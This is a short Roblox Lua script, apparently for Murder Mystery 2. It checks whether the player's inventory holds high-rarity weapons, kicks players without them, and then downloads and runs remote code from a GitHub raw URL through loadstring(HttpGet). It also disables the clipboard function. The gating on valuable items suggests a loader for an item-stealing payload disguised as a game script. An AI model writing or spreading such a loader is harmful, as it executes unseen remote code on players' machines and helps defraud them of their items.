setclipboard = function() end

local p = game.Players.LocalPlayer
local itemData = require(
    game.ReplicatedStorage.Database.Sync.Item
)

local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)

local found = false

for itemName, amount in pairs(inv.Weapons.Owned) do
    if amount > 0 then
        local info = itemData[itemName]

        if info then
            local rarity = tostring(info.Rarity or "")

            if rarity == "Godly"
            or rarity == "Ancient"
            or rarity == "Vintage"
            or rarity == "Unique" then
                found = true
                break
            end
        end
    end
end

if not found then
    p:Kick("low value detected! run the script on another account")
    return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2"))()
